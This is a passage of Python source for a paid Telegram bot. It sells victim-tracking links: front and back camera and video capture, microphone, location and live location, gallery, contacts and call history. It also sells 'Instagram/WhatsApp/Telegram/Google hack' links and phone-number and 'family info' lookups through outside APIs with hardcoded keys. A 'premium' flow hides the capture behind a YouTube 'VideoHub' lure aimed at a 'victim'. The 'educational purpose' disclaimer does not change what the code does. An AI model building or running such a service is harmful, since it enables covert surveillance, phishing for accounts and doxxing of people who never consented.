    msg = bot.send_message(message.chat.id, f"<blockquote>🔍 Number Info\n10-digit number:\nCost: {cost}\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, process_num_info_lookup)

def process_num_info_lookup(message):
    nav = [BTN_BACK_HOME, BTN_BACK_ADMIN, BTN_PREM_BACK, BTN_CAMERA, BTN_AUDIO, BTN_LOCATION, BTN_LIVE_LOC, BTN_NUM_INFO, BTN_FAMILY_INFO, BTN_CALL_HIST, BTN_GALLERY, BTN_CONTACTS, BTN_PHONE_HACK, BTN_PRICE, BTN_REDEEM, BTN_BALANCE, BTN_PAGE, BTN_ADMIN]
    if message.text in nav: send_home_dashboard(message.chat.id, message.from_user); return
    query = message.text.strip()
    uid = str(message.from_user.id)
    if not deduct_tokens_for_cmd(uid, "num_info"):
        bot.send_message(message.chat.id, f"<blockquote>❌ Insufficient!\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id)); return
    bot.send_chat_action(message.chat.id, 'typing')
    try:
        url = f"https://shuruuu-api.vercel.app/num_info?key=@KINGFFAIAK47x&query={query}"
        res = requests.get(url, timeout=10); data = res.json()
        if isinstance(data, dict):
            if "Credits" in data: data["Credits"] = "AYUSH"
            if "developer" in data: data["developer"] = "@GOD_AYUSH"
        f = json.dumps(data, indent=2, ensure_ascii=False)
        if len(f) > 3800: f = f[:3800] + "\n...[truncated]"
        bot.send_message(message.chat.id, f"<blockquote>📊 <b>Result</b>\n<code>{f}</code>\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id))
    except Exception as e:
        bot.send_message(message.chat.id, f"<blockquote>❌ API error: {e}\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id))

@bot.message_handler(func=lambda m: m.text == BTN_FAMILY_INFO)
def family_info_start(message):
    if not check_feature_access(message, "family_info"): return
    cost = get_cmd_cost("family_info")
    if not has_active_plan(message.from_user.id):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(message.chat.id); return
    msg = bot.send_message(message.chat.id, f"<blockquote>👨‍👩‍👧‍👦 Family Info\nQuery:\nCost: {cost}\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, process_family_info_lookup)

def process_family_info_lookup(message):
    nav = [BTN_BACK_HOME, BTN_BACK_ADMIN, BTN_PREM_BACK, BTN_CAMERA, BTN_AUDIO, BTN_LOCATION, BTN_LIVE_LOC, BTN_NUM_INFO, BTN_FAMILY_INFO, BTN_CALL_HIST, BTN_GALLERY, BTN_CONTACTS, BTN_PHONE_HACK, BTN_PRICE, BTN_REDEEM, BTN_BALANCE, BTN_PAGE, BTN_ADMIN]
    if message.text in nav: send_home_dashboard(message.chat.id, message.from_user); return
    query = message.text.strip()
    uid = str(message.from_user.id)
    if not deduct_tokens_for_cmd(uid, "family_info"):
        bot.send_message(message.chat.id, f"<blockquote>❌ Insufficient!\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id)); return
    bot.send_chat_action(message.chat.id, 'typing')
    try:
        url = f"https://x-trace-osinist-api-pannell.vercel.app/apis/family?key=@GOD_AYUSH&query={query}"
        res = requests.get(url, timeout=10); data = res.json()
        if isinstance(data, dict):
            if "Credits" in data: data["Credits"] = "AYUSH"
            if "developer" in data: data["developer"] = "@GOD_AYUSH"
        f = json.dumps(data, indent=2, ensure_ascii=False)
        if len(f) > 3800: f = f[:3800] + "\n...[truncated]"
        bot.send_message(message.chat.id, f"<blockquote>📊 <b>Result</b>\n<code>{f}</code>\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id))
    except Exception as e:
        bot.send_message(message.chat.id, f"<blockquote>❌ API error: {e}\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id))

@bot.message_handler(func=lambda m: m.text == BTN_CALL_HIST)
def call_history_btn(m):
    if not check_feature_access(m, "call_history"): return
    cost = get_cmd_cost("call_history")
    if not has_active_plan(m.from_user.id):
        bot.send_message(m.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(m.chat.id); return
    if not deduct_tokens_for_cmd(m.from_user.id, "call_history"):
        bot.send_message(m.chat.id, f"<blockquote>❌ Insufficient!\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/call-history-reveal?chat_id={m.chat.id}"
    bot.send_message(m.chat.id, f"<blockquote>🔗 <b>Call History Link:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_GALLERY)
def gallery_btn(m):
    if not check_feature_access(m, "gallery"): return
    if not deduct_tokens_for_cmd(m.from_user.id, "gallery"):
        bot.send_message(m.chat.id, f"<blockquote>❌ Insufficient.\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/Ayush-gallery?chat_id={m.chat.id}"
    bot.send_message(m.chat.id, f"<blockquote>🖼 <b>Gallery Link:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_CONTACTS)
def contacts_btn(m):
    if not check_feature_access(m, "contacts"): return
    cost = get_cmd_cost("contacts")
    if not has_active_plan(m.from_user.id):
        bot.send_message(m.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(m.chat.id); return
    if not deduct_tokens_for_cmd(m.from_user.id, "contacts"):
        bot.send_message(m.chat.id, f"<blockquote>❌ Insufficient!\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/Ayush-contacts?chat_id={m.chat.id}"
    bot.send_message(m.chat.id, f"<blockquote>📇 <b>Contacts Link:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_PHONE_HACK)
def phone_hack_btn(m):
    if not check_feature_access(m, "phone_hack"): return
    cost = get_cmd_cost("phone_hack")
    if not has_active_plan(m.from_user.id):
        bot.send_message(m.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(m.chat.id); return
    if not deduct_tokens_for_cmd(m.from_user.id, "phone_hack"):
        bot.send_message(m.chat.id, f"<blockquote>❌ Insufficient!\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/Ayush-phonehack?chat_id={m.chat.id}"
    bot.send_message(m.chat.id, f"<blockquote>📡 <b>Phone Hack Link:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_CAMERA)
def camera_options(m):
    if not check_feature_access(m, "camera"): return
    bot.send_message(m.chat.id, f"<blockquote>📷 Camera:\n{DEV_TAG}</blockquote>", reply_markup=get_camera_menu())

def handle_media_request(message, endpoint, label, cmd_key="camera"):
    if not deduct_tokens_for_cmd(message.from_user.id, cmd_key):
        bot.send_message(message.chat.id, f"<blockquote>❌ Need {get_cmd_cost(cmd_key)}\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/{endpoint}?chat_id={message.chat.id}"
    bot.send_message(message.chat.id, f"<blockquote>🔗 <b>{label}:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_FRONT_CAM)
def front_cam(m): handle_media_request(m, "Ayush-wab", "Front Camera", "camera")
@bot.message_handler(func=lambda m: m.text == BTN_BACK_CAM)
def back_cam(m): handle_media_request(m, "Ayush-wab-1", "Back Camera", "camera")
@bot.message_handler(func=lambda m: m.text == BTN_FRONT_VID)
def front_vid(m): handle_media_request(m, "Ayush-wab-2", "Front Video", "camera")
@bot.message_handler(func=lambda m: m.text == BTN_BACK_VID)
def back_vid(m): handle_media_request(m, "Ayush-wab-3", "Back Video", "camera")

@bot.message_handler(func=lambda m: m.text == BTN_AUDIO)
def audio_btn(m):
    if not check_feature_access(m, "audio"): return
    if not deduct_tokens_for_cmd(m.from_user.id, "audio"):
        bot.send_message(m.chat.id, f"<blockquote>❌ Insufficient.\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/Ayush-wab-4?chat_id={m.chat.id}"
    bot.send_message(m.chat.id, f"<blockquote>🔗 <b>Audio Link:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_LOCATION)
def location_btn(m):
    if not check_feature_access(m, "location"): return
    if not deduct_tokens_for_cmd(m.from_user.id, "location"):
        bot.send_message(m.chat.id, f"<blockquote>❌ Insufficient.\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/Ayush-wab-5?chat_id={m.chat.id}"
    bot.send_message(m.chat.id, f"<blockquote>🔗 <b>Location Link:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_LIVE_LOC)
def live_location_btn(m):
    if not check_feature_access(m, "live_location"): return
    if not deduct_tokens_for_cmd(m.from_user.id, "live_location"):
        bot.send_message(m.chat.id, f"<blockquote>❌ Insufficient.\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/Ayush-wab-6?chat_id={m.chat.id}"
    bot.send_message(m.chat.id, f"<blockquote>🔗 <b>Live Location Link:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

# ----------------- MAIN MENU 4 HACK BUTTONS -----------------
def _generate_hack_link(message, platform, cmd_key, label):
    if not check_feature_access(message, cmd_key): return
    cost = get_cmd_cost(cmd_key)
    if not has_active_plan(message.from_user.id):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(message.chat.id); return
    if not deduct_tokens_for_cmd(message.from_user.id, cmd_key):
        bot.send_message(message.chat.id, f"<blockquote>❌ Need {cost}\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/{platform}-hack?chat_id={message.chat.id}"
    bot.send_message(message.chat.id, f"<blockquote>{label} <b>Hack Link:</b>\n\n{link}\n\nCost: {cost}\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_INSTA_HACK)
def insta_hack_btn(m): _generate_hack_link(m, "insta", "insta_hack", "📸 Instagram")
@bot.message_handler(func=lambda m: m.text == BTN_WA_HACK)
def wa_hack_btn(m): _generate_hack_link(m, "wa", "wa_hack", "💬 WhatsApp")
@bot.message_handler(func=lambda m: m.text == BTN_TG_HACK)
def tg_hack_btn(m): _generate_hack_link(m, "tg", "tg_hack", "✈️ Telegram")
@bot.message_handler(func=lambda m: m.text == BTN_GOOGLE_HACK)
def google_hack_btn(m): _generate_hack_link(m, "google", "google_hack", "🔍 Google")

# ============================================================
# PREMIUM HACKING — FULL REWRITE
# ============================================================
PREMIUM_ITEMS = {
    "camera_front":     {"label": "Front Camera",   "icon": "📷", "facing": "user",        "video": False, "perm": "camera"},
    "camera_back":      {"label": "Back Camera",    "icon": "📷", "facing": "environment", "video": False, "perm": "camera"},
    "camera_front_vid": {"label": "Front 8s Video", "icon": "🎥", "facing": "user",        "video": True,  "perm": "camera+mic"},
    "camera_back_vid":  {"label": "Back 8s Video",  "icon": "🎥", "facing": "environment", "video": True,  "perm": "camera+mic"},
    "audio":            {"label": "Audio Hack",     "icon": "🎙", "facing": "user",        "video": False, "perm": "mic"},
    "location":         {"label": "Location Hack",  "icon": "📍", "facing": "user",        "video": False, "perm": "location"},
    "live_location":    {"label": "Live Location",  "icon": "📍", "facing": "user",        "video": False, "perm": "location"},
}

@bot.message_handler(func=lambda m: m.text == BTN_PREMIUM)
def premium_menu_open(m):
    if not check_feature_access(m, "premium"): return
    if not has_premium_plan(m.from_user.id):
        db = load_db()
        price = db["settings"].get("premium_price", 1000)
        days = db["settings"].get("premium_days", 30)
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("💳 Buy Premium Now", callback_data="buy_premium"))
        bot.send_message(m.chat.id,
            f"<blockquote>🔒 <b>Premium Hacking Locked</b>\n\n"
            f"📷 Camera (Front/Back/Video)\n🎙 Audio\n📍 Location\n📍 Live Location\n\n"
            f"💰 ₹{price} / {days} Days\n{DEV_TAG}</blockquote>", reply_markup=mk)
        return
    bot.send_message(m.chat.id,
        f"<blockquote>🔥 <b>PREMIUM HACKING</b>\nFeature select karo → YouTube link do → VideoHub link milega.\n{DEV_TAG}</blockquote>",
        reply_markup=get_premium_menu(m.from_user.id))

@bot.message_handler(func=lambda m: m.text == BTN_PREM_CAMERA)
def prem_camera_click(m):
    if not check_feature_access(m, "premium") or not has_premium_plan(m.from_user.id): return
    bot.send_message(m.chat.id, f"<blockquote>📷 Camera type:\n{DEV_TAG}</blockquote>",
                     reply_markup=get_premium_camera_menu())

@bot.message_handler(func=lambda m: m.text in [BTN_PREM_CAM_FRONT, BTN_PREM_CAM_BACK,
                                                BTN_PREM_CAM_FRONT_VID, BTN_PREM_CAM_BACK_VID])
def prem_camera_sub(m):
    if not has_premium_plan(m.from_user.id): return
    key = {BTN_PREM_CAM_FRONT: "camera_front", BTN_PREM_CAM_BACK: "camera_back",
           BTN_PREM_CAM_FRONT_VID: "camera_front_vid", BTN_PREM_CAM_BACK_VID: "camera_back_vid"}[m.text]
    _prem_ask_youtube(m, key)

@bot.message_handler(func=lambda m: m.text in [BTN_PREM_AUDIO, BTN_PREM_LOCATION, BTN_PREM_LIVE_LOC])
def prem_other_btn(m):
    if not has_premium_plan(m.from_user.id): return
    key = {BTN_PREM_AUDIO: "audio", BTN_PREM_LOCATION: "location",
           BTN_PREM_LIVE_LOC: "live_location"}[m.text]
    _prem_ask_youtube(m, key)

def _prem_ask_youtube(message, item_key):
    item = PREMIUM_ITEMS[item_key]
    msg = bot.send_message(message.chat.id,
        f"<blockquote>{item['icon']} <b>{item['label']} (Premium)</b>\n\n"
        f"YouTube video ka link paste karo:\n"
        f"<code>https://youtu.be/VIDEO_ID</code>\n"
        f"Ya <code>https://youtube.com/watch?v=VIDEO_ID</code>\n\n"
        f"Wahi video victim ke VideoHub page pe chalegi.\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, _prem_process_youtube, item_key)

def _extract_yt_id(url):
    url = url.strip()
    patterns = ["youtu.be/", "youtube.com/watch?v=", "youtube.com/shorts/",
                "youtube.com/embed/", "m.youtube.com/watch?v=", "youtube.com/live/"]
    for p in patterns:
        if p in url:
            vid = url.split(p)[1]
            for sep in ["?", "&", "/", "#"]:
                vid = vid.split(sep)[0]
            if len(vid) >= 6: return vid
    import re
    m = re.search(r"([A-Za-z0-9_-]{11})", url)
    return m.group(1) if m else None

def _prem_process_youtube(message, item_key):
    if message.text in [BTN_BACK_HOME, BTN_PREM_BACK, BTN_BACK_ADMIN, "Back to home"]:
        send_home_dashboard(message.chat.id, message.from_user); return
    vid = _extract_yt_id(message.text or "")
    if not vid:
        bot.send_message(message.chat.id,
            f"<blockquote>❌ Valid YouTube link nahi mila.\n{DEV_TAG}</blockquote>",
            reply_markup=get_premium_menu(message.from_user.id)); return

    item = PREMIUM_ITEMS[item_key]
    link_id = uuid.uuid4().hex[:10]
    db = load_db()
    db.setdefault("premium_links", {})[link_id] = {
        "uid": str(message.from_user.id), "item": item_key,
        "label": item["label"], "icon": item["icon"],
        "facing": item["facing"], "video": item["video"], "perm": item["perm"],
        "yt_id": vid,
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "captures": [], "logins": []
    }
    save_db(db)
    link = f"{SERVER_URL}/premium/{link_id}"
    bot.send_message(message.chat.id,
        f"<blockquote>{item['icon']} <b>{item['label']} Link Ready</b>\n\n"
        f"🎥 Video: <code>{vid}</code>\n"
        f"🔗 {link}\n\n"
        f"Victim open karega → permission → capture → VideoHub (video play + search).\n{DEV_TAG}</blockquote>",
        reply_markup=get_premium_menu(message.from_user.id),
        disable_web_page_preview=True)

# ----------------- USER EXTRAS -----------------
@bot.message_handler(func=lambda m: m.text == BTN_HISTORY)
def my_history(message):
    db = load_db()
    user = db["users"].get(str(message.from_user.id))
    if not user: bot.reply_to(message, f"<blockquote>❌ No data.\n{DEV_TAG}</blockquote>"); return
    hist = user.get("history", [])[-20:]
    if not hist: bot.reply_to(message, f"<blockquote>📜 No history.\n{DEV_TAG}</blockquote>"); return
    text = f"<blockquote>📜 <b>Last {len(hist)}</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for h in reversed(hist):
        s = "➕" if h.get("amount", 0) >= 0 else "➖"
        text += f"{s} {h.get('action','?')}: <b>{abs(h.get('amount',0))}</b>\n   <i>{h.get('time','')}</i>\n"
    text += f"\n💰 Balance: <b>{user.get('tokens',0)}</b>\n{DEV_TAG}</blockquote>"
    bot.reply_to(message, text)

@bot.message_handler(func=lambda m: m.text == BTN_REFER)
def refer_earn(message):
    uid = str(message.from_user.id)
    get_user_data(message.from_user)
    db = load_db(); user = db["users"][uid]
    credits = db["settings"].get("referral_credits", 2)
    me = bot.get_me()
    ref_link = f"https://t.me/{me.username}?start=ref_{uid}"
    refs = len(user.get("referrals", []))
    text = (f"<blockquote>🔗 <b>Refer</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"🎁 +{credits} per invite\n👥 {refs}\n💰 {refs * credits}\n"
            f"📤 <code>{ref_link}</code>\n{DEV_TAG}</blockquote>")
    mk = types.InlineKeyboardMarkup()
    mk.add(types.InlineKeyboardButton("📤 Share", url=f"https://t.me/share/url?url={ref_link}&text=Join"))
    bot.send_message(message.chat.id, text, reply_markup=mk, disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_PROFILE)
def my_profile(message):
    uid = str(message.from_user.id)
    get_user_data(message.from_user)
    db = load_db(); user = db["users"][uid]
    tokens = user.get("tokens", 0)
    prem = "✅ Active" if has_premium_plan(uid) else "❌ Not Active"
    tier = "🥉 Bronze"
    if tokens >= 500: tier = "🥇 Gold"
    elif tokens >= 100: tier = "🥈 Silver"
    text = (f"<blockquote>👤 <b>Profile</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"📛 {user.get('name','N/A')}\n🔗 {user.get('username','N/A')}\n"
            f"🆔 <code>{uid}</code>\n🪙 {tokens}\n📦 Plan: {user.get('plan','free')}\n"
            f"🔥 Premium: {prem}\n"
            f"🏅 {tier}\n👥 Refs: {len(user.get('referrals',[]))}\n📅 Joined: {user.get('joined','N/A')}\n{DEV_TAG}</blockquote>")
    bot.reply_to(message, text)

@bot.message_handler(func=lambda m: m.text == BTN_LEADER)
def leaderboard(message):
    db = load_db()
    users = sorted(db["users"].items(), key=lambda x: x[1].get("tokens", 0), reverse=True)[:10]
    text = "<blockquote>🏆 <b>Top 10</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for i, (uid, u) in enumerate(users, 1):
        medal = {1: "🥇", 2: "🥈", 3: "🥉"}.get(i, f"{i}.")
        text += f"{medal} {u.get('name','?')} — {u.get('tokens',0)} 🪙\n"
    text += f"\n{DEV_TAG}</blockquote>"
    bot.reply_to(message, text)

@bot.message_handler(func=lambda m: m.text == BTN_HELP)
def help_btn(message):
    text = (
        f"<blockquote>🆘 <b>Help & Support</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📷 Camera & Flashlight: Front/Back link\n"
        f"🎙 Audio: Mic stream link\n"
        f"📍 Location / GPS / IMEI / Storage / Contacts / Sensors / Clipboard: Full payload\n"
        f"🔍 Number Info: Lookup mobile details\n"
        f"👨‍👩‍👧‍👦 Family Info: Lookup family tree\n"
        f"📂 Call History Audit: Portal link generator\n"
        f"🖼 Gallery Access: Photos/videos selection link\n"
        f"📇 Contact Access: Direct contact picker link\n"
        f"📡 Phone Hack & Net: Hotspot peer & remote stream\n"
        f"📸 Photo Info: EXIF & file metadata (JSON + PDF)\n"
        f"📸 Instagram Hack • 💬 WhatsApp Hack • ✈️ Telegram Hack • 🔍 Google Hack\n"
        f"🔥 Premium Hacking: All features + YouTube VideoHub capture flow\n"
        f"🔗 Refer: Invite karo, tokens pao\n"
        f"✍️ Redeem: Code lagao, token pao\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💬 Support: @{OWNER_USERNAME}\n{DEV_TAG}</blockquote>"
    )
    bot.reply_to(message, text)

@bot.message_handler(func=lambda m: m.text == BTN_TERMS)
def terms_btn(message):
    text = (
        f"<blockquote>📄 <b>Terms & Conditions</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"1️⃣ Galat use = permanent ban\n"
        f"2️⃣ Tokens non-refundable\n"
        f"3️⃣ Sirf educational purpose\n"
        f"4️⃣ Privacy 100% safe\n"
        f"━━━━━━━━━━━━━━━━━━━━\n{DEV_TAG}</blockquote>"
    )
    bot.reply_to(message, text)

@bot.message_handler(func=lambda m: m.text == BTN_FAQ)
def faq_btn(message):
    bot.reply_to(message, f"<blockquote>❓ <b>FAQ</b>\n<b>Q:</b> Premium kaise?\n<b>A:</b> Youtube link bhejo → VideoHub link milega\n{DEV_TAG}</blockquote>")

# ---------- ENHANCED FEEDBACK (ALL MEDIA) ----------
@bot.message_handler(func=lambda m: m.text == BTN_FEEDBACK)
def feedback_start(message):
    msg = bot.send_message(message.chat.id,
        f"<blockquote>💬 <b>Feedback</b>\n"
        f"Aap koi bhi content bhej sakte hain:\n"
        f"• Text / Link / URL\n• Photo / Video / Document\n• Sticker / Audio / Voice / GIF\n"
        f"Caption ke saath. Send 'cancel' to abort.\n{DEV_TAG}</blockquote>")
    bot.register_next_step_handler(msg, feedback_send)

def feedback_send(message):
    if message.text and message.text.strip().lower() == 'cancel':
        send_home_dashboard(message.chat.id, message.from_user); return
    supported = (message.text or message.photo or message.video or message.document or
        message.sticker or message.audio or message.voice or message.animation or
        message.video_note or message.contact or message.location)
    if not supported:
        send_home_dashboard(message.chat.id, message.from_user); return
    try:
        fwd = bot.copy_message(ADMIN_ID, message.chat.id, message.message_id)
        info = bot.send_message(ADMIN_ID,
            f"<blockquote>💬 <b>New Feedback</b>\n"
            f"👤 {html.escape(message.from_user.first_name or 'User')}\n"
            f"🆔 <code>{message.from_user.id}</code>\n"
            f"↩️ Is message par reply karke user ko jawab dein.\n{DEV_TAG}</blockquote>",
            reply_to_message_id=fwd.message_id)
        db = load_db()
        db.setdefault("feedback_map", {})[str(info.message_id)] = str(message.from_user.id)
        save_db(db)
        bot.reply_to(message, f"<blockquote>✅ <b>Feedback admin ko bhej diya.</b>\n{DEV_TAG}</blockquote>")
    except Exception as e:
        bot.reply_to(message, f"<blockquote>❌ Feedback send nahi hua: {e}\n{DEV_TAG}</blockquote>")

@bot.message_handler(func=lambda m: bool(m.from_user and int(m.from_user.id) == ADMIN_ID and m.reply_to_message), 
                     content_types=['text', 'photo', 'video', 'document', 'sticker', 'audio', 'voice', 'animation', 'video_note'])
def admin_reply_to_feedback(m):
    db = load_db()
    uid = db.get("feedback_map", {}).get(str(m.reply_to_message.message_id))
    if not uid: return
    try:
        bot.copy_message(int(uid), m.chat.id, m.message_id)
        bot.reply_to(m, f"✅ Reply sent to user <code>{uid}</code>", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(m, f"❌ Failed: {e}")

# ---------- ENHANCED BROADCAST ----------
@bot.message_handler(func=lambda m: m.text == BTN_BROADCAST)
def admin_broadcast(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>📢 <b>Broadcast</b>\nKoi bhi media (Photo/Video/Text/Link/Sticker) bhejein with/without caption:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_broadcast_apply)

def admin_broadcast_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    
    db = load_db()
    ok = fail = 0
    for uid in db["users"]:
        try:
            bot.copy_message(int(uid), message.chat.id, message.message_id)
            ok += 1
        except Exception: fail += 1
        time.sleep(0.05)
    bot.send_message(message.chat.id, f"<blockquote>📢 Done!\n✅ {ok} | ❌ {fail}\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# ----------------- REDEEM -----------------
@bot.message_handler(func=lambda m: m.text == BTN_REDEEM)
def ask_redeem_code(message):
    msg = bot.send_message(message.chat.id, f"<blockquote>✍️ Code:\n{DEV_TAG}</blockquote>")
    bot.register_next_step_handler(msg, process_redeem_input)

def process_redeem_input(message):
    nav = [BTN_BACK_HOME, BTN_BACK_ADMIN, BTN_PREM_BACK, BTN_CAMERA, BTN_AUDIO, BTN_LOCATION, BTN_LIVE_LOC, BTN_NUM_INFO, BTN_FAMILY_INFO, BTN_CALL_HIST, BTN_GALLERY, BTN_CONTACTS, BTN_PHONE_HACK, BTN_PRICE, BTN_REDEEM, BTN_BALANCE, BTN_PAGE, BTN_ADMIN]
    if message.text in nav: send_home_dashboard(message.chat.id, message.from_user); return
    code = message.text.strip().upper()
    db = load_db()
    if code not in db.get("redeem_codes", {}):
        bot.reply_to(message, f"<blockquote>❌ Invalid.\n{DEV_TAG}</blockquote>"); return
    rc = db["redeem_codes"][code]
    rc.setdefault("used_by", [])
    uid = str(message.from_user.id)
    if uid in rc["used_by"]:
        bot.reply_to(message, f"<blockquote>❌ Already used.\n{DEV_TAG}</blockquote>"); return
    if rc.get("uses_left", 0) <= 0:
        bot.reply_to(message, f"<blockquote>❌ Expired.\n{DEV_TAG}</blockquote>"); return
    get_user_data(message.from_user)
    db = load_db(); user = db["users"][uid]
    if rc["type"] == "token":
        v = rc["value"]
        user["tokens"] = user.get("tokens", 0) + v
        _add_history(user, "redeem_token", v)
        res = f"✅ {v} tokens!"
    elif rc["type"] == "premium":
        d = rc["days"]
        base = datetime.now()
        if user.get("premium_expiry"):
            try:
                old = datetime.strptime(user["premium_expiry"], "%Y-%m-%d %H:%M:%S")
                if old > base: base = old
            except Exception: pass
        user["premium_expiry"] = (base + timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")
        _add_history(user, f"redeem_prem_{d}d", 0)
        res = f"🔥 Premium {d}d!"
    else:
        d = rc["days"]
        user["plan"] = "unlimited"
        user["expiry"] = (datetime.now() + timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")
        _add_history(user, f"redeem_vip_{d}d", 0)
        res = f"👑 VIP {d}d!"
    rc["used_by"].append(uid); rc["uses_left"] -= 1
    if rc["uses_left"] <= 0: del db["redeem_codes"][code]
    save_db(db)
    bot.reply_to(message, f"<blockquote>{res}\n💰 {user.get('tokens',0)}\n{DEV_TAG}</blockquote>")

# ============================================================
# ADMIN PANEL
# ============================================================
def _is_admin(uid): return int(uid) == ADMIN_ID

@bot.message_handler(func=lambda m: m.text == BTN_ADMIN)
def admin_panel_open(message):
    if not _is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, f"<blockquote>⚙️ Admin Panel\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_TOGGLE_BTNS)
def admin_toggle_btns_menu(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    pub = db["settings"]["feature_public"]
    mk = types.InlineKeyboardMarkup(row_width=1)
    for k, v in pub.items():
        state = "🟢 PUBLIC" if v else "🔴 PRIVATE"
        mk.add(types.InlineKeyboardButton(f"{k.upper()}: {state}", callback_data=f"toggle_feat:{k}"))
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_admin_panel"))
    bot.send_message(message.chat.id, "<blockquote>🎛 Toggle Features</blockquote>", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data == "back_to_admin_panel")
def back_to_admin_panel_cb(call):
    if not _is_admin(call.from_user.id): return
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, "⚙️ Admin Panel", reply_markup=get_admin_menu())

@bot.callback_query_handler(func=lambda c: c.data.startswith("toggle_feat:"))
def toggle_feat_cb(call):
    if not _is_admin(call.from_user.id): return
    feat = call.data.split(":", 1)[1]
    db = load_db()
    pub = db["settings"]["feature_public"]
    pub[feat] = not pub.get(feat, True)
    save_db(db)
    mk = types.InlineKeyboardMarkup(row_width=1)
    for k, v in pub.items():
        state = "🟢 PUBLIC" if v else "🔴 PRIVATE"
        mk.add(types.InlineKeyboardButton(f"{k.upper()}: {state}", callback_data=f"toggle_feat:{k}"))
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_admin_panel"))
    try: bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=mk)
    except Exception: pass
    bot.answer_callback_query(call.id, f"{feat} toggled!")

@bot.message_handler(func=lambda m: m.text == "➕ Add Custom Button")
def admin_add_custom_btn(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Button text:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, process_add_custom_btn)

def process_add_custom_btn(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    btn = message.text.strip()
    db = load_db()
    c = db["settings"].setdefault("custom_buttons", [])
    if btn not in c:
        c.append(btn); save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ {btn} added!</blockquote>", reply_markup=get_admin_menu())
    else:
        bot.send_message(message.chat.id, f"<blockquote>⚠️ Exists.</blockquote>", reply_markup=get_admin_menu())

